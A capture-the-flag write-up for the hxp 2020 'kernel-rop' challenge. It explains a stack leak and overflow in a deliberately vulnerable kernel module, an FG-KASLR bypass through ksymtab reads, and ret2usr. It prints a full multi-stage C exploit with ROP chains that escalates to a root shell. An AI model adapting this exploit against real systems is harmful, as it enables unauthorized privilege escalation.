# hxp2020 kernel-rop

*kernel-rop fg-kalsr*



## Vulnerability

​	The vulnerability is more than straight forward, the *hackme_read* and *hackme_write* gives you stack value leak and stack overflow respectively.

<img src="pic/2021-11-02 14-39-24 的屏幕截图.png" alt="2021-11-02 14-39-24 的屏幕截图" style="zoom:50%;" />

<img src="pic/2021-11-02 14-40-14 的屏幕截图.png" alt="2021-11-02 14-40-14 的屏幕截图" style="zoom:50%;" />



​	The stack overflow length is long enough to put a rop chain in the stack. And we may leak the kernel canary and kernel load base address from the stack value leak by *hackme_read*.

​	The only thing need to be mentioned here is that the kernel is compiled with **fg-kalsr** enabled. And we have to bypass it to achieve kernel rop and ret2usr.



## Exploitation

from the top level we

1. leak kernel canary and kernel load base address by *hackme_read*
2. leak the load address of *prepare_kernel_creds* and *commit_creds* by reading `ksymtab`
3. invoke *commit_creds(prepare_kernel_creds(0))* to achive escalation and ret2usr to pop a root shell



### leak kernel canary & kernel load base address

​	The vulnerability in *hackme_read* allows us to read a rather long range of stack value in the kenrel stack by setting the `size` parameter. We can leak values in the stack to find out the kernel canary and find some function pointer that leaks the kernel load base address.

```c
	if((hackme_fd = open("/dev/hackme", O_RDWR)) == -1) ErrExit("[-] open() error1");
    read(hackme_fd, buf, LEAKLEN);
    unsigned long* p;
    p = (unsigned long*)buf;
    for(int i=0;i<LEAKLEN/8;i++){
        printf("[*] kernel stack leak[%d] : 0x%lx\n", i, p[i]);
    }
    kernel_canary = p[16];
    kernel_load_base = p[38] - 0xa157;
    printf("[*] kernel load @ 0x%lx\n", kernel_load_base);
    printf("[*] kernel canary: 0x%lx\n", kernel_canary);
```



### by pass fg-kalsr

​	We may notice the kernel is enabled with **fg-kalsr** during the leaking stage for each time we leak the stack values and find some funtion pointers, their offsets from the kernel load base are unique.

​	read more about fg-kalsr by pass 

1. https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/#about-kaslr-and-fg-kaslr



​	First we find some gadget to read the `ksymtab` from the region where fg-kalsr does not function. The region is `_text` to `__x86_retpoline_r15`, which is `_text` to `_text+0x400dc6`. 3 gadgets can be found to leak value in `ksymtab`.

```
pop rax; ret
mov eax, qword ptr [rax + 0x10]; pop rbp; ret;
pop rdi; pop rbp; ret;
```

​	We put the address of `ksymtab` minus 0x10 to rax and read the value to `eax`, then we ret to userspace, read the `eax` to get the offset value.

```c
	unsigned long* rop = (unsigned long*)((unsigned long)buf + 0x80);
    *rop = kernel_canary;
    rop = (unsigned long*)((unsigned long)buf + 0xA0);
    *rop++ = kernel_load_base + POPRAX;
    *rop++ = kernel_load_base + SYMCOMMITCRED - 0x10;
    *rop++ = kernel_load_base + MOVRAXPOPRBP;
    *rop++ = 0xcafebabe;
    *rop++ = kernel_load_base + SWAPGS;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (unsigned long)stage1;
    *rop++ = state.cs;
    *rop++ = state.rflag;
    *rop++ = state.sp;
    *rop++ = state.ss;
```

​	The leak of *commit_creds* and *prepare_kernel_creds* are similar. We put each leak operation in a seperate funtion and are reted to during ret2usr.



### prompt a root shell

​	Old fashioned ret2usr



### exp

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>

#include "kernelpwn.h"

#define LEAKLEN 0x150
#define SYMCOMMITCRED 0xf87d90
#define SYMPREPARECRED 0xf8d4fc
#define SWAPGS 0x200f26
#define POPRAX 0x4d11
#define MOVRAXPOPRBP 0x4aae
// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;
#define POPRDIRBP 0x38a0

int hackme_fd;
unsigned long hackme_buf_addr;
unsigned long kernel_canary;
unsigned long kernel_load_base;
unsigned long commit_cred_addr;
unsigned long prepare_cred_addr;
unsigned long offset_value;
char buf[0x1000];
struct cpu_state state;

int stage3(){
    __asm__(
        "mov %0, rax\n"
        : "=r"(offset_value)
        :
        :"memory"
    );
    printf("[*] cred struct @ 0x%lx\n", offset_value);

    unsigned long* rop = (unsigned long*)((unsigned long)buf + 0x80);
    *rop = kernel_canary;
    rop = (unsigned long*)((unsigned long)buf + 0xA0);
    *rop++ = kernel_load_base + POPRDIRBP;
    *rop++ = offset_value;
    *rop++ = 0;
    *rop++ = commit_cred_addr;
    *rop++ = kernel_load_base + SWAPGS;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (unsigned long)promt_root_shell;
    *rop++ = state.cs;
    *rop++ = state.rflag;
    *rop++ = state.sp;
    *rop++ = state.ss;
    write(hackme_fd, buf, 0x100);
    return 0;
}

int stage2(){
    __asm__(
        "mov %0, rax\n"
        : "=r"(offset_value)
        :
        :"memory"
    );
    prepare_cred_addr = kernel_load_base + SYMPREPARECRED + (int)offset_value;
    printf("[*] prepare_kernel_creds @ 0x%lx\n", prepare_cred_addr);

    unsigned long* rop = (unsigned long*)((unsigned long)buf + 0x80);
    *rop = kernel_canary;
    rop = (unsigned long*)((unsigned long)buf + 0xA0);
    *rop++ = kernel_load_base + POPRDIRBP;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = prepare_cred_addr;
    *rop++ = kernel_load_base + SWAPGS;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (unsigned long)stage3;
    *rop++ = state.cs;
    *rop++ = state.rflag;
    *rop++ = state.sp;
    *rop++ = state.ss;
    write(hackme_fd, buf, 0x100);
    return 0;
}


int stage1(){
    __asm__(
        "mov %0, rax\n"
        : "=r"(offset_value)
        :
        :"memory"
    );
    commit_cred_addr = kernel_load_base + SYMCOMMITCRED + (int)offset_value;
    printf("[*] commit_cred @ 0x%lx\n", commit_cred_addr);
    unsigned long* rop = (unsigned long*)((unsigned long)buf + 0x80);
    *rop = kernel_canary;
    rop = (unsigned long*)((unsigned long)buf + 0xA0);
    *rop++ = kernel_load_base + POPRAX;
    *rop++ = kernel_load_base + SYMPREPARECRED - 0x10;
    *rop++ = kernel_load_base + MOVRAXPOPRBP;
    *rop++ = 0xcafebabe;
    *rop++ = kernel_load_base + SWAPGS;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (unsigned long)stage2;
    *rop++ = state.cs;
    *rop++ = state.rflag;
    *rop++ = state.sp;
    *rop++ = state.ss;
    write(hackme_fd, buf, 0x100);
    return 0;
}

int main(){
    save_state(state);
    if((hackme_fd = open("/dev/hackme", O_RDWR)) == -1) ErrExit("[-] open() error1");
    read(hackme_fd, buf, LEAKLEN);
    unsigned long* p;
    p = (unsigned long*)buf;
    for(int i=0;i<LEAKLEN/8;i++){
        printf("[*] kernel stack leak[%d] : 0x%lx\n", i, p[i]);
    }
    kernel_canary = p[16];
    kernel_load_base = p[38] - 0xa157;
    printf("[*] kernel load @ 0x%lx\n", kernel_load_base);
    printf("[*] kernel canary: 0x%lx\n", kernel_canary);

    unsigned long* rop = (unsigned long*)((unsigned long)buf + 0x80);
    *rop = kernel_canary;
    rop = (unsigned long*)((unsigned long)buf + 0xA0);
    *rop++ = kernel_load_base + POPRAX;
    *rop++ = kernel_load_base + SYMCOMMITCRED - 0x10;
    *rop++ = kernel_load_base + MOVRAXPOPRBP;
    *rop++ = 0xcafebabe;
    *rop++ = kernel_load_base + SWAPGS;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (unsigned long)stage1;
    *rop++ = state.cs;
    *rop++ = state.rflag;
    *rop++ = state.sp;
    *rop++ = state.ss;

    write(hackme_fd, buf, 0x100);
    return 0;
}
```